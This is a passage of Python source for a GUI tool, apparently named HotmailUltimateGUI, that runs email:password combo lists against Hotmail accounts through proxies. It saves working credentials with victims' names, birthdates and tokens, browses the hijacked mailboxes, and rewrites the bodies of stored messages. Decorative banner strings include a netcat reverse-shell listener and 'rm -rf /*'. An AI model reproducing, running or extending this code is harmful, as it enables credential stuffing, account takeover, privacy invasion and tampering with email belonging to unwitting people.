        for msg in messages:
            received = msg['received'][:19] if msg['received'] else ''
            att_mark = "Y" if msg['has_attachments'] else "N"
            read_mark = "Y" if msg['is_read'] else "N"
            self.indexer_tree.insert("", "end", values=(
                msg['subject'][:50],
                f"{msg['from_name']} <{msg['from_email']}>"[:40],
                received,
                att_mark,
                read_mark,
                msg['preview'][:60]
            ))

        self.indexer_page_label.configure(text=f"Page {self.current_page + 1}")
        self.indexer_status.configure(text=f"{len(messages)} messages loaded")

    def search_indexer_messages(self):
        query = self.indexer_search_entry.get().strip()
        if not query:
            self.load_indexer_messages()
        else:
            self.current_page = 0
            self.load_indexer_messages(query)

    def clear_indexer_search(self):
        self.indexer_search_entry.delete(0, "end")
        self.current_page = 0
        self.load_indexer_messages()

    def indexer_prev_page(self):
        if self.current_page > 0:
            self.current_page -= 1
            self.load_indexer_messages()

    def indexer_next_page(self):
        self.current_page += 1
        self.load_indexer_messages()

    def on_indexer_double_click(self, event):
        """Show email details on double-click"""
        item = self.indexer_tree.selection()
        if not item:
            return
        idx = self.indexer_tree.index(item[0])
        if idx < len(self.current_messages):
            msg = self.current_messages[idx]
            self.show_email_detail_popup(msg)

    def show_email_detail_popup(self, msg):
        popup = ctk.CTkToplevel(self.root)
        popup.title(f"Email: {msg['subject'][:50]}")
        popup.geometry("700x500")
        popup.configure(fg_color="#1a1a1a")

        ctk.CTkLabel(popup, text=msg['subject'], font=("Consolas",14,"bold"),
                     text_color="#ff8c00", wraplength=650).pack(pady=10)

        info = f"From: {msg['from_name']} <{msg['from_email']}>\n"
        info += f"Date: {msg['received']}\n"
        info += f"Has Attachments: {msg['has_attachments']}\n"
        info += f"Importance: {msg.get('importance', 'normal')}"

        ctk.CTkLabel(popup, text=info, font=("Courier",11), justify="left",
                     text_color="#cccccc").pack(pady=5, padx=20, anchor="w")

        ctk.CTkLabel(popup, text="Preview:", font=("Consolas",11,"bold"),
                     text_color="#00d4ff").pack(anchor="w", padx=20, pady=(10,0))

        preview_box = ctk.CTkTextbox(popup, height=200, font=("Courier",10))
        preview_box.pack(fill="both", expand=True, padx=20, pady=5)
        preview_box.insert("0.0", msg['preview'])

        btn_frame = ctk.CTkFrame(popup, fg_color="transparent")
        btn_frame.pack(pady=10)

        def copy_id():
            pyperclip.copy(msg['id'])
            ctk.CTkLabel(btn_frame, text="ID Copied!", text_color="lime").pack(side="left", padx=5)

        ctk.CTkButton(btn_frame, text="Copy Message ID", command=copy_id).pack(side="left", padx=5)
        ctk.CTkButton(btn_frame, text="Close", command=popup.destroy, fg_color="red").pack(side="left", padx=5)

    # ==================== BODY REPLACER METHODS ====================
    def refresh_replacer_accounts(self):
        """Populate replacer account dropdown"""
        if not self.selected_hits_for_tools:
            self.replacer_log.insert("end", "[WARN] No accounts available. Select in Checker tab first.\n")
            return

        acct_names = [f"{a['email']} ({a['user_id'][:8]}...)" for a in self.selected_hits_for_tools]
        self.replacer_acct_menu.configure(values=acct_names)
        self.replacer_acct_var.set(acct_names[0])
        self.replacer_log.insert("end", f"[INFO] Loaded {len(acct_names)} accounts\n")
        self.replacer_log.see("end")

    def get_selected_replacer_account(self):
        """Get the currently selected account dict for replacer"""
        sel = self.replacer_acct_var.get()
        if "No account" in sel or not self.selected_hits_for_tools:
            return None
        values = self.replacer_acct_menu.cget("values")
        if sel not in values:
            return None
        idx = values.index(sel)
        if 0 <= idx < len(self.selected_hits_for_tools):
            return self.selected_hits_for_tools[idx]
        return None

    def fetch_body_for_edit(self):
        """Fetch message body for editing"""
        acct = self.get_selected_replacer_account()
        msg_id = self.replacer_msgid_entry.get().strip()

        if not acct:
            self.replacer_result_label.configure(text="Select account first!", text_color="red")
            return
        if not msg_id:
            self.replacer_result_label.configure(text="Enter Message ID!", text_color="red")
            return

        self.current_account_for_replacer = acct
        self.replacer_result_label.configure(text="Fetching...", text_color="yellow")

        def worker():
            try:
                result = self.body_replacer.get_message_body(acct['access_token'], acct['user_id'], msg_id)
                self.root.after(0, lambda: self._populate_body_editor(result, msg_id))
            except Exception as e:
                self.root.after(0, lambda: self.replacer_result_label.configure(
                    text=f"Error: {str(e)}", text_color="red"))

        threading.Thread(target=worker, daemon=True).start()

    def _populate_body_editor(self, result, msg_id):
        if not result:
            self.replacer_result_label.configure(text="Failed to fetch body!", text_color="red")
            return

        self.current_message_for_edit = {
            'id': msg_id,
            'body_type': result['body_type']
        }
        self.replacer_subject_var.set(result['subject'])
        self.replacer_body_type.set(result['body_type'])

        self.replacer_editor.delete("0.0", "end")
        self.replacer_editor.insert("0.0", result['body_content'])

        self.replacer_result_label.configure(text="Body loaded! Edit and Apply.", text_color="lime")
        play_success_chime()

    def use_indexer_selection(self):
        """Use the currently selected message from Email Indexer"""
        item = self.indexer_tree.selection()
        if not item:
            self.replacer_result_label.configure(text="Select a message in Email Indexer first!", text_color="red")
            return

        idx = self.indexer_tree.index(item[0])
        if idx >= len(self.current_messages):
            return

        msg = self.current_messages[idx]
        self.replacer_msgid_entry.delete(0, "end")
        self.replacer_msgid_entry.insert(0, msg['id'])

        # Also set the same account in replacer tab
        if self.current_account_for_indexer:
            acct_names = list(self.replacer_acct_menu.cget("values"))
            for i, a in enumerate(self.selected_hits_for_tools):
                if a['email'] == self.current_account_for_indexer['email']:
                    self.replacer_acct_var.set(acct_names[i])
                    break

        self.replacer_result_label.configure(text="Message ID loaded from Indexer!", text_color="lime")

    def apply_body_replacement(self):
        """Apply the body replacement operation with automatic snapshot backup"""
        acct = self.get_selected_replacer_account()
        if not self.current_message_for_edit or not acct:
            self.replacer_result_label.configure(text="Fetch body first!", text_color="red")
            return

        mode = self.replacer_mode.get()
        body_type = self.replacer_body_type.get()
        msg_id = self.current_message_for_edit['id']

        # Check if we should auto-snapshot
        auto_snapshot = hasattr(self, 'auto_snapshot_var') and self.auto_snapshot_var.get()

        self.replacer_result_label.configure(text="Capturing snapshot...", text_color="yellow")
        self.replacer_log.insert("end", f"[INFO] Starting body replacement with snapshot...\n")

        def worker():
            try:
                snapshot_result = None

                # Auto-capture snapshot BEFORE modification
                if auto_snapshot:
                    self.root.after(0, lambda: self.replacer_log.insert("end", "[SNAP] Capturing pre-modification snapshot...\n"))
                    self.root.after(0, lambda: self.replacer_log.see("end"))

                    # Use the indexer's get_rfc822_raw for forensic capture
                    try:
                        raw_data = self.indexer.get_rfc822_raw(acct['access_token'], acct['user_id'], msg_id)
                        snapshot_result = self.snapshot_engine.capture_snapshot(
                            acct['access_token'], acct['user_id'], msg_id, raw_data
                        )
                        if snapshot_result.get('status') == 'captured':
                            self.root.after(0, lambda: self.replacer_log.insert("end",
                                f"[✓] Snapshot captured: {snapshot_result['snapshot_id'][:16]}...\n"))
                            self.root.after(0, lambda: self.replacer_log.see("end"))
                            # Update snapshot history display
                            self.root.after(0, lambda: self._refresh_message_snapshots(msg_id))
                        else:
                            self.root.after(0, lambda: self.replacer_log.insert("end",
                                f"[!] Snapshot warning: {snapshot_result.get('error', 'unknown')}\n"))
                    except Exception as snap_err:
                        self.root.after(0, lambda: self.replacer_log.insert("end",
                            f"[!] Snapshot failed: {str(snap_err)}\n"))

                # Perform the body replacement
                self.root.after(0, lambda: self.replacer_result_label.configure(text="Applying changes...", text_color="yellow"))

                if mode == "replace":
                    new_body = self.replacer_editor.get("0.0", "end")
                    success, msg = self.body_replacer.replace_body(
                        acct['access_token'], acct['user_id'], msg_id, new_body, body_type)
                elif mode == "append":
                    text = self.replacer_editor.get("0.0", "end").strip()
                    success, msg = self.body_replacer.append_to_body(
                        acct['access_token'], acct['user_id'], msg_id, text, body_type)
                elif mode == "prepend":
                    text = self.replacer_editor.get("0.0", "end").strip()
                    success, msg = self.body_replacer.prepend_to_body(
                        acct['access_token'], acct['user_id'], msg_id, text, body_type)
                elif mode == "find_replace":
                    find_text = self.replacer_find_entry.get()
                    replace_text = self.replacer_replace_entry.get()
                    if not find_text:
                        self.root.after(0, lambda: self.replacer_result_label.configure(
                            text="Enter find text!", text_color="red"))
                        return
                    success, msg = self.body_replacer.find_and_replace_in_body(
                        acct['access_token'], acct['user_id'], msg_id, find_text, replace_text, body_type)
                else:
                    success, msg = False, "Unknown mode"

                if success:
                    # Log success with snapshot info
                    if snapshot_result:
                        self.root.after(0, lambda: self.replacer_log.insert("end",
                            f"[✓] Body replaced. Rollback available via snapshot: {snapshot_result['snapshot_id'][:16]}...\n"))
                    else:
                        self.root.after(0, lambda: self.replacer_log.insert("end",
                            f"[✓] Body replaced successfully\n"))
                    self.root.after(0, lambda: self.replacer_log.see("end"))
                    self.root.after(0, play_success_chime)
                else:
                    self.root.after(0, lambda: self.replacer_log.insert("end",
                        f"[✗] Replacement failed: {msg}\n", "red"))

                color = "lime" if success else "red"
                self.root.after(0, lambda: self.replacer_result_label.configure(text=msg, text_color=color))

            except Exception as e:
                self.root.after(0, lambda: self.replacer_result_label.configure(
                    text=f"Error: {str(e)}", text_color="red"))
                self.root.after(0, lambda: self.replacer_log.insert("end",
                    f"[✗] Error: {str(e)}\n", "red"))

        threading.Thread(target=worker, daemon=True).start()

    def capture_current_snapshot(self):
        """Manually capture a snapshot of the current message"""
        acct = self.get_selected_replacer_account()
        msg_id = self.replacer_msgid_entry.get().strip()

        if not acct:
            self.replacer_log.insert("end", "[WARN] Select an account first\n")
            return
        if not msg_id:
            self.replacer_log.insert("end", "[WARN] Enter Message ID first\n")
            return

        self.replacer_result_label.configure(text="Capturing snapshot...", text_color="yellow")

        def worker():
            try:
                # Fetch raw email data
                raw_data = self.indexer.get_rfc822_raw(acct['access_token'], acct['user_id'], msg_id)

                # Capture snapshot
                result = self.snapshot_engine.capture_snapshot(
                    acct['access_token'], acct['user_id'], msg_id, raw_data
                )

                if result.get('status') == 'captured':
                    self.root.after(0, lambda: self.replacer_result_label.configure(
                        text=f"✓ Snapshot: {result['snapshot_id'][:16]}...", text_color="lime"))
                    self.root.after(0, lambda: self.replacer_log.insert("end",
                        f"[✓] Snapshot captured!\n  ID: {result['snapshot_id']}\n  Hash: {result['hash'][:32]}...\n  Size: {result['size']} bytes\n"))
                    self.root.after(0, lambda: self._refresh_message_snapshots(msg_id))
                    self.root.after(0, play_success_chime)
                else:
                    self.root.after(0, lambda: self.replacer_result_label.configure(
                        text=f"✗ Snapshot failed: {result.get('error', 'unknown')}", text_color="red"))
                    self.root.after(0, lambda: self.replacer_log.insert("end",
                        f"[✗] Snapshot failed: {result.get('error', 'unknown')}\n", "red"))

            except Exception as e:
                self.root.after(0, lambda: self.replacer_result_label.configure(
                    text=f"Error: {str(e)}", text_color="red"))
                self.root.after(0, lambda: self.replacer_log.insert("end",
                    f"[✗] Error: {str(e)}\n", "red"))

        threading.Thread(target=worker, daemon=True).start()

    def rollback_from_snapshot(self):
        """Rollback current message from the latest snapshot"""
        msg_id = self.replacer_msgid_entry.get().strip()
        if not msg_id:
            self.replacer_log.insert("end", "[WARN] Enter Message ID first\n")
            return

        # Get latest snapshot for this message
        snapshots = self.snapshot_engine.get_snapshots_for_message(msg_id)
        if not snapshots:
            self.replacer_log.insert("end", "[WARN] No snapshots found for this message\n")
            return

        latest = snapshots[-1]  # Most recent snapshot
        self.replacer_log.insert("end", f"[INFO] Rolling back to snapshot: {latest['snapshot_id'][:16]}...\n")

        result = self.snapshot_engine.restore_snapshot(latest['snapshot_id'])
        if result['status'] == 'restored':
            # Load restored content into editor
            try:
                content = result['data'].decode('utf-8', errors='replace')
                self.replacer_editor.delete("0.0", "end")
                self.replacer_editor.insert("0.0", content)

                self.replacer_result_label.configure(text="✓ Rolled back to snapshot!", text_color="lime")
                self.replacer_log.insert("end", f"[✓] Rollback complete from {latest['timestamp']}\n")
                self.replacer_log.insert("end", f"    Original subject: {latest.get('subject', 'N/A')}\n")
                self.replacer_log.see("end")
                play_success_chime()
            except Exception as e:
                self.replacer_log.insert("end", f"[✗] Failed to load rollback: {str(e)}\n", "red")
        else:
            self.replacer_log.insert("end", f"[✗] Rollback failed: {result.get('error', 'unknown')}\n", "red")

    def _refresh_message_snapshots(self, msg_id):
        """Refresh the snapshot history display for current message"""
        if not hasattr(self, 'message_snapshots_label'):
            return

        snapshots = self.snapshot_engine.get_snapshots_for_message(msg_id)
        if snapshots:
            latest = snapshots[-1]
            count = len(snapshots)
            self.message_snapshots_label.configure(
                text=f"📸 Snapshots: {count} | Latest: {latest['snapshot_id'][:16]}... | {latest['timestamp'][:10]}",
                text_color="#00ff88"
            )
        else:
            self.message_snapshots_label.configure(text="📸 No snapshots", text_color="#666666")

    # ==================== THEME & UI HELPERS ====================
    def change_theme(self, theme_name):
        self.current_theme = theme_name
        theme = self.themes[theme_name]
        ctk.set_default_color_theme("dark-blue")
        self.root.configure(fg_color=theme["bg"])
        self.checker_tab.configure(fg_color=theme["bg"])
        self.indexer_tab.configure(fg_color=theme["bg"])
        self.replacer_tab.configure(fg_color=theme["bg"])
        self.downloader_tab.configure(fg_color=theme["bg"])
        self.progress.configure(progress_color=theme["progress"])
        self.raw_log.configure(text_color=theme["text"])
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background=theme["bg"], foreground=theme["fg"],
                        fieldbackground=theme["bg"], font=("Courier",10))
        style.map('Treeview', background=[('selected', theme["fg"])])

    def toggle_mute(self):
        global SOUND_ENABLED
        self.muted = not self.muted
        SOUND_ENABLED = not self.muted
        self.mute_btn.configure(text="MUTE" if not self.muted else "UNMUTE")

    def set_popup_countries(self, val):
        if val == "ALL":
            self.popup_countries = {"AU","US","GB","CA","DE","FR","JP","BR","IN"}
        else:
            self.popup_countries = {val}

    def animate_quotes(self):
        quotes = [
            ">_ HACK THE PLANET", ">_ I'm in.", ">_ Access Granted.",
            ">_ We are Anonymous.", ">_ rm -rf /*", ">_ sudo su -",
            ">_ 01001001 01101110 01110100 01100101 01101100", ">_ Never gonna give you up",
            ">_ Exploiting MSFT", ">_ Token acquired.", ">_ Cookie monster."
        ]
        def update():
            self.quote_var.set(random.choice(quotes))
            self.root.after(4000, update)
        update()

    def animate_commands(self):
        cmds = [
            "$ nmap -sV -p- target.com", "$ sqlmap -u site.com --dbs",
            "$ hydra -l admin -P wordlist.txt ssh://target",
            "$ msfconsole -q", "$ curl -X POST --data '{\"cmd\":\"id\"}' http://target",
            "$ john --format=nt hash.txt", "$ aircrack-ng -w dict.cap",
            "$ git clone https://github.com/exploitdb/exploitdb", "$ nc -lvp 4444 -e /bin/bash"
        ]
        def update():
            self.cmd_var.set(random.choice(cmds))
            self.root.after(5000, update)
        update()

    # ==================== INPUT HANDLING ====================
    def toggle_input_mode(self):
        if self.input_type.get() == "file":
            self.file_frame.grid()
            self.paste_frame.grid_remove()
        else:
            self.file_frame.grid_remove()
            self.paste_frame.grid()

    def browse_input(self):
        path = filedialog.askopenfilename(filetypes=[("Text files","*.txt")])
        if path:
            self.input_file = path
            self.file_entry.delete(0,"end")
            self.file_entry.insert(0, path)

    def browse_output(self):
        path = filedialog.askdirectory()
        if path:
            self.output_dir = path
            self.out_entry.delete(0,"end")
            self.out_entry.insert(0, path)

    def browse_proxy(self):
        path = filedialog.askopenfilename(filetypes=[("Text files","*.txt")])
        if path:
            self.proxy_entry.delete(0,"end")
            self.proxy_entry.insert(0, path)

    def toggle_proxy(self):
        if self.proxy_var.get():
            self.proxy_frame.pack(side="left", padx=5)
        else:
            self.proxy_frame.pack_forget()

    def create_temp_file(self):
        content = self.paste_text.get("0.0","end").strip()
        if not content:
            messagebox.showerror("Error","Paste area empty!")
            return
        self.temp_file = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8")
        self.temp_file.write(content)
        self.temp_file.close()
        self.input_file = self.temp_file.name
        self.file_entry.delete(0,"end")
        self.file_entry.insert(0, self.input_file)
        messagebox.showinfo("Temp File", f"Created: {self.input_file}\nNow click START HACK.")

    def load_combos(self):
        if not self.input_file or not os.path.exists(self.input_file):
            return []
        combos = []
        with open(self.input_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and '@' in line and ':' in line:
                    combos.append(line)
        return combos

    # ==================== CHECKER CONTROL ====================
    def start_check(self):
        combos = self.load_combos()
        if not combos:
            messagebox.showerror("Error","No valid combos found (email:password)")
            return

        self.keyword = self.keyword_entry.get().strip()
        try:
            self.threads = int(self.threads_spin.get())
        except:
            self.threads = 10

        proxy_list = []
        if self.proxy_var.get() and self.proxy_entry.get():
            try:
                with open(self.proxy_entry.get(), 'r') as f:
                    proxy_list = [ln.strip() for ln in f if ln.strip()]
                self.log_raw(f"[INFO] Loaded {len(proxy_list)} proxies", "info")
            except:
                self.log_raw("[WARN] Failed to load proxies", "info")

        self.results_data.clear()
        for row in self.tree.get_children():
            self.tree.delete(row)
        self.selected_hits_for_tools.clear()

        self.running = True
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.progress.set(0)

        self.stats = {"hits":0,"custom":0,"bad":0}
        self.update_stats_label()

        self.checker = HotmailChecker(
            on_log=self.log_raw,
            on_hit=self.add_hit,
            on_stats_update=self.update_stats,
            on_progress=self.update_progress,
            on_finished=self.check_finished
        )
        self.checker_thread = threading.Thread(target=self.checker.run,
                                               args=(combos, proxy_list, self.keyword, self.threads))
        self.checker_thread.daemon = True
        self.checker_thread.start()

    def stop_check(self):
        if self.checker:
            self.checker.stop()
        self.running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")

    def add_hit(self, info, hit_type):
        country = info["country"].upper()
        if not self.muted:
            if hit_type == "keyword":
                if country == "AU":
                    play_au_jingle()
                else:
                    play_country_sound(country)
        if country in self.popup_countries or (self.popup_countries == "ALL" and hit_type=="keyword"):
            self.show_giant_popup(info)

        line = f"{info['email']}:{info['password']} | Name={info['name']} | Country={country} | Birth={info['birthdate']} | Lang={info['mailbox_lang']} | TZ={info['mailbox_tz']}"
        if hit_type == "keyword":
            line += f" | Total={info['total']}"
        output_dir = self.out_entry.get()
        if hit_type == "keyword":
            with open(os.path.join(output_dir,"Hotmail-Hits.txt"), 'a', encoding='utf-8') as f:
                f.write(line + "\n")
        else:
            with open(os.path.join(output_dir,"Hotmail-Custom.txt"), 'a', encoding='utf-8') as f:
                f.write(line + "\n")

        info['checkbox_state'] = False
        self.results_data.append(info)
        self.root.after(0, lambda: self.insert_table_row(info, hit_type))
        self.log_raw(f"[HIT] {line}", "good")

    def insert_table_row(self, info, hit_type):
        is_selected = info.get('checkbox_state', False)
        check_mark = "[x]" if is_selected else "[ ]"
        values = (
            check_mark,
            info["email"], info["password"], info["country"], info["name"],
            info["birthdate"], info["mailbox_lang"], info["mailbox_tz"],
            info["total"] if hit_type=="keyword" else "0"
        )
        self.tree.insert("", "end", values=values)

    def on_tree_click(self, event):
        region = self.tree.identify_region(event.x, event.y)
        if region != "cell":
            return
        column = self.tree.identify_column(event.x)
        if column != "#1":
            return
        item = self.tree.identify_row(event.y)
        if not item:
            return
        self.toggle_checkbox(item)

    def toggle_checkbox(self, item_id):
        current = self.tree.set(item_id, "Select")
        new_val = "[x]" if current == "[ ]" else "[ ]"
        self.tree.set(item_id, "Select", new_val)
        idx = self.tree.index(item_id)
        if idx < len(self.results_data):
            info = self.results_data[idx]
            if new_val == "[x]":
                if not any(d['email'] == info['email'] for d in self.selected_hits_for_tools):
                    self.selected_hits_for_tools.append({
                        'email': info['email'],
                        'access_token': info['access_token'],
                        'user_id': info['user_id'],
                        'dob': info['birthdate'],
                        'mailbox_lang': info['mailbox_lang'],
                        'mailbox_tz': info['mailbox_tz']
                    })
                info['checkbox_state'] = True
            else:
                self.selected_hits_for_tools = [d for d in self.selected_hits_for_tools if d['email'] != info['email']]
                info['checkbox_state'] = False

    def sort_table(self, col):
        reverse = False
        if hasattr(self, 'last_sort') and self.last_sort == col:
            reverse = True
            self.last_sort = None
        else:
            self.last_sort = col
        if col == "email":
            self.results_data.sort(key=lambda x: x["email"].lower(), reverse=reverse)
        elif col == "country":
            self.results_data.sort(key=lambda x: x["country"], reverse=reverse)
        elif col == "name":
            self.results_data.sort(key=lambda x: x["name"], reverse=reverse)
        elif col == "birthdate":
            self.results_data.sort(key=lambda x: x["birthdate"], reverse=reverse)
        for row in self.tree.get_children():
            self.tree.delete(row)
        for info in self.results_data:
            is_selected = info.get('checkbox_state', False)
            check_mark = "[x]" if is_selected else "[ ]"
            values = (
                check_mark,
                info["email"], info["password"], info["country"], info["name"],
                info["birthdate"], info["mailbox_lang"], info["mailbox_tz"],
                info["total"] if info["has_keyword"] else "0"
            )
            self.tree.insert("", "end", values=values)

    def show_giant_popup(self, info):
        popup = ctk.CTkToplevel(self.root)
        popup.title("AUSTRALIA ACCOUNT DETECTED")
        popup.geometry("600x400")
        popup.attributes('-topmost', True)
        popup.configure(fg_color="#ff8c00")
        label = ctk.CTkLabel(popup, text="AUSTRALIA HIT!", font=("Courier",24,"bold"),
                             text_color="black")
        label.pack(pady=20)
        details = f"Email: {info['email']}\nPassword: {info['password']}\nCountry: {info['country']}\nName: {info['name']}\nBirth: {info['birthdate']}\nMailbox Lang: {info['mailbox_lang']}\nTimezone: {info['mailbox_tz']}"
        det_label = ctk.CTkLabel(popup, text=details, font=("Courier",14), justify="left",
                                 text_color="black")
        det_label.pack(pady=10)
        def copy_creds():
            pyperclip.copy(f"{info['email']}:{info['password']}")
            copy_btn.configure(text="COPIED!", state="disabled")
            popup.after(2000, popup.destroy)
        copy_btn = ctk.CTkButton(popup, text="COPY EMAIL:PASS", command=copy_creds,
                                 fg_color="black", text_color="orange", font=("Courier",12,"bold"))
        copy_btn.pack(pady=10)
        close_btn = ctk.CTkButton(popup, text="CLOSE", command=popup.destroy,
                                  fg_color="red", text_color="white")
        close_btn.pack(pady=5)
        popup.after(30000, popup.destroy)

    def log_raw(self, msg, level):
        color_map = {"bad":"red", "good":"lime", "info":"yellow"}
        color = color_map.get(level, "white")
        self.root.after(0, lambda: self.raw_log.insert("end", msg + "\n", color))
        self.raw_log.see("end")

    def update_stats(self, stats):
        self.stats = stats
        self.root.after(0, self.update_stats_label)

    def update_stats_label(self):
        self.stats_label.configure(text=f"Hits:{self.stats['hits']} | Custom:{self.stats['custom']} | Bad:{self.stats['bad']}")

    def update_progress(self, processed, total):
        self.root.after(0, lambda: self.progress.set(processed/total))

    def check_finished(self, stats):
        self.running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.log_raw(f"[INFO] Finished. Hits:{stats['hits']}, Custom:{stats['custom']}, Bad:{stats['bad']}", "info")
        if self.temp_file and os.path.exists(self.temp_file.name):
            try:
                os.unlink(self.temp_file.name)
                self.log_raw("[INFO] Temp file deleted", "info")
            except:
                pass

    def poll_queues(self):
        self.root.after(100, self.poll_queues)

    def on_closing(self):
        if self.running and self.checker:
            self.checker.stop()
        if self.temp_file and os.path.exists(self.temp_file.name):
            try:
                os.unlink(self.temp_file.name)
            except:
                pass
        self.root.destroy()


# ==================== MAIN ENTRY POINT ====================
def show_splash_then_main():
    """Show ultimate animated splash screen then launch main application"""
    def launch_main():
        app = HotmailUltimateGUI()
        app.root.mainloop()

    splash = UltimateSplashScreen(on_complete=launch_main)
    splash.show()


if __name__ == "__main__":
    show_splash_then_main()
